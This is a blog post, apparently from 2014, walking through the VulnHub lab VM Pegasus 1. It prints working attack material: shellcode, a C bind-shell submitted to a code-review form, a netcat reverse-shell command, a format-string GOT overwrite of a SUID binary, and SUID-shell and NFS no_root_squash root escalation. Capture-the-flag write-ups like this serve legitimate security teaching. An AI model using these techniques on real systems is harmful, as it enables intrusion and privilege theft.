<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>hoof to root solving pegasus 1 | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="introduction
Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).

     


Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&mldr; again. You will see this in the my_first section.
Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
Lets begin.">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="hoof to root solving pegasus 1">
<meta property="og:description" content="introduction
Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).

     


Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&mldr; again. You will see this in the my_first section.
Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
Lets begin.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-12-23T08:29:49+00:00">
<meta property="article:modified_time" content="2014-12-23T08:29:49+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="hoof to root solving pegasus 1">
<meta name=twitter:description content="introduction
Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).

     


Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&mldr; again. You will see this in the my_first section.
Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
Lets begin.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"hoof to root solving pegasus 1","item":"https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"hoof to root solving pegasus 1","name":"hoof to root solving pegasus 1","description":"introduction Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).\n  Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson\u0026hellip; again. You will see this in the my_first section.\nLike many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!\nLets begin.\n","keywords":[],"articleBody":"introduction Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).\n  Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson… again. You will see this in the my_first section.\nLike many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!\nLets begin.\nnmap, again Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one… via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:\nroot@kali:~# nmap --reason -sV 192.168.56.101 -p- Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 09:16 SAST Nmap scan report for 192.168.56.101 Host is up, received arp-response (0.00022s latency). Not shown: 65531 closed ports Reason: 65531 resets PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0) 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) 8088/tcp open http syn-ack nginx 1.1.19 55625/tcp open status syn-ack 1 (RPC #100024) MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at http://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds tcp/22, tcp/111, tcp/8088 and tcp/55625. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on tcp/8088.\nstomping some hoofs with pegasus Browsing to http://192.168.56.101:8088/, we are presented with a picture of Pegasus:\n  I manually tried to browse to things like robots.txt etc, but everything responded with the same image. This was until I decided to browse to index.php, in an attempt to check that the web server is configured to serve PHP content:\n  So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, .php scripts would 404 correctly. With that in mind, it was time to reach for wfuzz to discover some more.\nroot@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.101:8088/FUZZ.php ******************************************************** * Wfuzz 2.0 - The Web Bruteforcer * ******************************************************** Target: http://192.168.56.101:8088/FUZZ.php Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt Total requests: 1660 ================================================================== ID Response Lines Word Chars Request ================================================================== 01426: C=200 0 L 4 W 19 Ch \" - submit\" And we have a HTTP 200 response for submit.php. So, I browsed to http://192.168.56.101:8088/submit.php:\n  Well that isn’t exactly useful. I played a little with the submit.php by sending a POST with some --data, but nothing useful came of it. Almost everything came back with No data to process.\nAdmittedly, this was my first hurdle. I was thinking if there is a submit.php, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I’ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. wfuzz was working with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt, when finally I get a HTTP 200 for codereview.php.\n  pwning mike So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data code to the previously found submit.php.\nOk. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.\nPHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute /bin/nc 192.168.56.102 4444 -e /bin/sh or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.\nEventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to system() in it:\n  Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to system, or C due to its system. Obviously though, system() is being filtered out, so I would need an alternative.\ninsert fade to black\nCAPTION: many hours later\nAfter exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of\n#include // msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c unsigned char buf[] = \"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\" \"\\x5b\\x5e\\x52\\x68\\x02\\x00\\x11\\x5c\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\" \"\\x66\\x58\\xcd\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\" \"\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x68\\x2f\" \"\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\" \"\\x0b\\xcd\\x80\"; int main() { int (*ret)() = (int(*)())buf; ret(); } This was supposed to open me a tcp/4444 shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I’d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on this. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be ‘reviewed’:\n// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+\u0026cd=11\u0026hl=en\u0026ct=clnk\u0026gl=za // http://bigpointyteeth.se/code/bindshell.c #include #include #include #include #include #include #include  #define SHELL \"/bin/sh\" // shell to execute #define NAME \"rsync\" // name of the forked bindshell shown in ps  int main(int argc, char *argv[]) { char msg[16]; int srv_sockfd, new_sockfd; socklen_t new_addrlen; struct sockaddr_in srv_addr, new_addr; // fork into background  if (fork() == 0) { if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0))  0) { return -1; } srv_addr.sin_family = PF_INET; srv_addr.sin_port = htons(atoi(\"4444\")); srv_addr.sin_addr.s_addr = htonl(INADDR_ANY); if (bind(srv_sockfd, (struct sockaddr *)\u0026srv_addr, sizeof(srv_addr))  0) { return -1; } if (listen(srv_sockfd, 1)  0) { return -1; } // accept loop  for (;;) { new_addrlen = sizeof(new_addr); new_sockfd = accept(srv_sockfd, (struct sockaddr *)\u0026new_addr, \u0026new_addrlen); if (new_sockfd  0) { return -1; } // fork to handle new connection  if (fork() == 0) { // close old listener  close(srv_sockfd); // print the parent pid which should be killed in order  // to remove the persistant bindshell listener  sprintf(msg, \"ppid=%d\\n\", getppid()); write(new_sockfd, msg, strlen(msg)); dup2(new_sockfd, 2); dup2(new_sockfd, 1); dup2(new_sockfd, 0); execl(SHELL, NAME, NULL); return 0; } else close(new_sockfd); } // end accept loop  } // end fork into background  return 0; } All of my attempts were followed by a nmap on tcp/4444 to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):\nroot@kali:~# nmap 192.168.56.101 -p 4444 Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 11:33 SAST Nmap scan report for 192.168.56.101 Host is up (0.00034s latency). PORT STATE SERVICE 4444/tcp open krb524 MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems) Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds Awesome, so lets connect and see what we have:\nroot@kali:~# nc -v 192.168.56.101 4444 192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out (UNKNOWN) [192.168.56.101] 4444 (?) open ppid=10450 id uid=1001(mike) gid=1001(mike) groups=1001(mike) As was hoped for, a shell as mike. I quickly generated a new ssh key pair for Pegasus, and cat the public key to mike’s authorized_keys file and went on to SSH in as mike:\n# first I cat the public key so that I can copy it root@kali:~# cat pegasus.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali # next I connect to the bind shell listener and move to Mikes .shh directory root@kali:~# nc -v 192.168.56.101 4444 192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out (UNKNOWN) [192.168.56.101] 4444 (?) open ppid=10450 cd .ssh # next we append my public key to mikes authorized_keys echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R\"  authorized_keys ls -lh total 12K -rw-rw-r-- 1 mike mike 381 Dec 23 20:36 authorized_keys -rw------- 1 mike mike 1.7K Nov 18 12:39 id_rsa -rw-r--r-- 1 mike mike 222 Nov 18 17:39 known_hosts chmod 600 authorized_keys ^C # with the authorized_keys ready, I SSH in as mike using my key pair root@kali:~# ssh mike@192.168.56.101 -i pegasus Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686) * Documentation: https://help.ubuntu.com/ System information as of Tue Dec 23 20:36:47 AEDT 2014 System load: 0.0 Processes: 93 Usage of /: 6.8% of 18.32GB Users logged in: 0 Memory usage: 12% IP address for eth0: 192.168.56.101 Swap usage: 0% = There are 2 zombie processes. Graph this data and manage this system at: https://landscape.canonical.com/ Your Hardware Enablement Stack (HWE) is supported until April 2017. You have mail. Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129 mike@pegasus:~$ my_first, your_first, we_all_first With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in mike’s home (we will get to it shortly):\nmike@pegasus:~$ ls -lh total 16K -rwxr-xr-x 1 mike mike 845 Nov 18 20:52 check_code.sh drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail -rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first More enumeration revealed that /opt/ had a number of interesting parts to it as well:\nmike@pegasus:~$ ls -lh /opt/ total 12K drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs Piecing the web interface together, you will see that the submitted source is put into code.c in /opt/code_review/, and then compiled from the script in /home/mike/check_code.sh and eventually executed.\nThe /opt/git/ folder had what looked like remnants of the typical .git/ folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the main.c file from the git history.\nrebuilding main.c This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless\nEven though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:\nmike@pegasus:/opt/git/my_first.git$ git log commit 85365946a8142c52ee6040a029dd069b514c2ab0 Author: Mike Ross (none) Date: Tue Nov 25 04:48:01 2014 +1100 Committing some security fixes commit 0a8af1ed956518ec078b152ad7571105e2df26c6 Author: John Wall (none) Date: Tue Nov 25 04:39:42 2014 +1100 initial commit From the log we can see that there as an initial commit, and one more after that with some security fixes. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit 0a8af1ed:\nmike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed commit 0a8af1ed956518ec078b152ad7571105e2df26c6 Author: John Wall  Date: Tue Nov 25 04:39:42 2014 +1100 initial commit diff --git a/main.c b/main.c new file mode 100644 index 0000000..39c0182 --- /dev/null +++ b/main.c @@ -0,0 +1,133 @@ +#include  +#include  + +int calculator(); +int string_replay(); +int string_reverse(); +int quit(); + +int main() +{ + char selection[5]; + int sel; + char * err_check;  [... snip ...] Nice! We have a file main.c that was added. I copied the diff and saved it to init.patch, and then ran the patch:\nroot@kali:~# patch -p1 That gives us the state of files after commit 0a8af1ed which was labeled as the initial commit. The same process was followed for the next commit 85365946a8 which apparently included some security fixes. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.\nI inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:\ndiff --git a/main.c b/main.c index 39c0182..b6b2ed4 100644 --- a/main.c +++ b/main.c @@ -8,7 +8,7 @@ int quit();  [... snip ...] +  printf(\"Enter second number: \"); if (fgets(numberB, sizeof numberB, stdin) != NULL) { - int numA = strtol(numberA, \u0026err_check, 10);  int numB = strtol(numberB, \u0026err_check, 10); if (*err_check != '\\n') { - printf(\"Error details: \"); - printf(err_check); + printf(\"Error details: %s\", err_check);  printf(\"\\n\"); return 1; [... snip ...] printf(err_check); is the potentially vulnerable call… I think.\nthe calculator with a hole After toying with the git repository, my attention turned back to the SUID binary. When I run my_first, I am actually running it as john. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain john’s privileges! Sounds easy right. :P\nI quickly realized that the main.c file I got out of the git repository, was the sources for the my_first binary. So, my focus shifted to the piece of code I saw the security fix for.\nFirst, it was time to confirm my suspicion of a format string vulnerability:\nmike@pegasus:~$ ./my_first WELCOME TO MY FIRST TEST PROGRAM -------------------------------- Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: 1 Enter first number: 1 Enter second number: %x Error details: bf96cbec Selection: I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.\nAnyways, feels aside, it was time to work on a exploit.\nFor the format string exploit, I don’t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about Xerxes2 which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.\nEDIT I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. punching more than numbers So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \\x\\x\\x\\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to my_first’s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to @barrebas for subtly pointing the fail out ;p\nAs I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for printf() using the format string to system() instead. This means, the next time printf() is called, it would actually execute system() with the adjacent argument on the stack. Lets see how this was done.\ncompiling the format string We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the ./my_first binary to sample a successful run:\nmike@pegasus:~$ printf '1\\n1\\n1\\n4\\n' | ./my_first WELCOME TO MY FIRST TEST PROGRAM -------------------------------- Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: Enter first number: Enter second number: Result: 1 + 1 = 2 Selection: Goodbye! Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A’s, and then incrementing the format string arguments by 1 until we can find the 4 A’s. In my case, I will be formatting them as hex with %x, so I am searching for 41414141. The format string will therefore start as AAAA.0x%s. Note that in the below example we are using 2 x percentages (2 x ‘%') as it needs to be escaped in the shell:\nmike@pegasus:~$ printf '1\\n1\\nAAAA.0x%%x\\n4\\n' | ./my_first WELCOME TO MY FIRST TEST PROGRAM -------------------------------- Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: Enter first number: Enter second number: Error details: AAAA.0xbff5321c Selection: Goodbye! And we have the output of AAAA.0xbff5321c. Yay :) Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A’s:\nmike@pegasus:~$ printf '1\\n1\\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\\n4\\n' | ./my_first WELCOME TO MY FIRST TEST PROGRAM -------------------------------- Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141 Selection: Goodbye! mike@pegasus:~$ So, using direct parameter access in the format string, we can reference parameter 8 directly:\nmike@pegasus:~$ printf '1\\n1\\nAAAA.0x%%8$x\\n4\\n' | ./my_first WELCOME TO MY FIRST TEST PROGRAM -------------------------------- Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: Enter first number: Enter second number: Error details: AAAA.0x41414141 Selection: Goodbye! mike@pegasus:~$ Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output AAAA.0x41414141 of the format string AAAA.0x%8$x.\nNow we will move on to making use of the %n format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for printf() occurs ofc! Lets dump the GOT for ./my_first, and determine where it will go look for printf():\nmike@pegasus:~$ objdump -R ./my_first ./my_first: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049bec R_386_GLOB_DAT __gmon_start__ 08049c20 R_386_COPY stdin 08049bfc R_386_JUMP_SLOT printf 08049c00 R_386_JUMP_SLOT fgets 08049c04 R_386_JUMP_SLOT puts 08049c08 R_386_JUMP_SLOT __gmon_start__ 08049c0c R_386_JUMP_SLOT __libc_start_main 08049c10 R_386_JUMP_SLOT putchar 08049c14 R_386_JUMP_SLOT strtol The location of printf() will be looked up at 08049bfc. This is the part where we want to rewrite the address of printf() to that of libc’s system().\nThe last part we need is to know where system() actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of system() to be different every time ./my_first is run. To combat this, a neat little trick to increase the stack size can be used using ulimit. ulimit -s unlimited will maximize the stack size, effectively causing the ASLR to be practically nonexistent:\nmike@pegasus:~$ ulimit -s 8192 mike@pegasus:~$ ulimit -s unlimited mike@pegasus:~$ ulimit -s unlimited With the ASLR problem out of the way, lets leak the address of system():\n# fire up gdb mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first...(no debugging symbols found)...done. # set a break point as we enter main() (gdb) b main Breakpoint 1 at 0x804850f # run the binary (gdb) r Starting program: /home/mike/my_first Breakpoint 1, 0x0804850f in main () # leak the current address of system() (gdb) p system $1 = {} 0x40069060  (gdb) And so we learn that system() lives at 0x40069060. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using %n) a new address for printf() in the GOT at 08049bfc to point to system() at 0x40069060 instead of its real location.\nFor us to debug the application while we prepare the required padding for the format string, we will use the printf() used to pipe to ./my_first to redirect to a file instead. Then, in gdb, we will run the binary, redirecting the input from the file we will compile with the printf():\n# so, instead of the 4 x A's, we will now place the address # in the GOT that we want to override, and use the %x format # string to attempt writing to it mike@pegasus:~$ printf '1\\n1\\n\\xfc\\x9b\\x04\\x08%%8$n'  t mike@pegasus:~$ file t t: data # then, in gdb, we will grab the output of the new file called # t, and redirect it as input to my_first mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first...(no debugging symbols found)...done. # leak the current address that GOT points to for printf() (gdb) x/x 0x08049bfc 0x8049bfc : 0x080483b6 # run the binary with our exploit (t) as input (gdb) r [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: Enter first number: Enter second number: Error details: ��\u0004 Program received signal SIGSEGV, Segmentation fault. 0x00000004 in ?? () # inspect the new address the GOT points to for printf() (gdb) x/x 0x08049bfc 0x8049bfc : 0x00000004 (gdb) This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address 0x40069060 instead of 0x00000004 written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was \\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%44966u%%9$n, with a run in the debugger ending in:\n# prep the input file mike@pegasus:~$ printf '1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%44966u%%9$n'  t mike@pegasus:~$ # run it in the debugger (gdb) r (y or n) y Starting program: /home/mike/my_first [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: Enter first number: Enter second number: Error details: ���� [... snip ...] sh: 1: Selection:: not found Program received signal SIGSEGV, Segmentation fault. 0x08c3f98c in ?? () # check where the GOT points to for printf() (gdb) x/x 0x08049bfc 0x8049bfc : 0x40069060 # confirm system() is still there :) (gdb) p system $1 = {} 0x40069060  The binary crashes with sh: 1: Selection:: not found, meaning that it is now trying to run system(\"Selection:\") instead of printf(\"Selection:\") due to the GOT override.\nfinishing the exploit From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get Selection: to actually mean something, like prepare a small SUID C shell perhaps? :)\nI quickly compiled some C wrapper code to prepare a shell and ran the exploit.\n# Prep Selection: to make a SUID shell for john # and modify PATH mike@pegasus:~$ cat tojohn.c #include  int main() { system(\"cp /bin/sh /tmp/tojohn\"); system(\"chmod 4777 /tmp/tojohn\"); } mike@pegasus:~$ gcc tojohn.c -o \"Selection:\" mike@pegasus:~$ export PATH=/home/mike/:$PATH # run the exploit... mike@pegasus:~$ printf '1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%44966u%%9$n' | ./my_first WELCOME TO MY FIRST TEST PROGRAM -------------------------------- Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit Selection: Enter first number: Enter second number: Error details: ���� 10 Segmentation fault (core dumped) # ... and check /tmp mike@pegasus:~$ ls -lah /tmp/ total 108K drwxrwxrwt 2 root root 4.0K Dec 23 23:17 . drwxr-xr-x 22 root root 4.0K Nov 19 02:58 .. -rwsrwxrwx 1 john mike 98K Dec 23 23:17 tojohn mike@pegasus:~$ We have a new file tojohn in /tmp :D\nmike@pegasus:~$ /tmp/tojohn $ id uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike) hoofing (rooting) Pegasus I added the public key of the keypair I generated for Pegasus to john’s authorized_keys file and proceeded to SSH in as him.\nQuick enumeration showed that mike is allowed to start the nfs daemon via sudo:\njohn@pegasus:~$ sudo -l Matching Defaults entries for john on this host: env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User john may run the following commands on this host: (root) NOPASSWD: /usr/local/sbin/nfs john@pegasus:~$ sudo nfs Usage: nfs [start|stop] john@pegasus:~$ sudo nfs start * Exporting directories for NFS kernel daemon... [ OK ] * Starting NFS kernel daemon [ OK ] john@pegasus:~$ I checked out the /etc/exports file, and noticed the the no_root_squash flag for the /opt/nfs export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)\nSo, I mounted the share…\nroot@kali:~# mkdir nfs root@kali:~# mount 192.168.56.101:/opt/nfs nfs … prepped a SUID shell …\nroot@kali:~/Desktop/pegasus/nfs# cat shell.c #include  int main() { setuid(0); setgid(0); system(\"/bin/sh\"); } root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell root@kali:~/Desktop/pegasus/nfs# ls -lah total 20K drwxr-xr-x 2 root root 4.0K Dec 23 14:39 . drwxr-xr-x 3 root root 4.0K Dec 23 14:32 .. -rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell -rw-r--r-- 1 root root 79 Dec 23 14:39 shell.c … and rooted 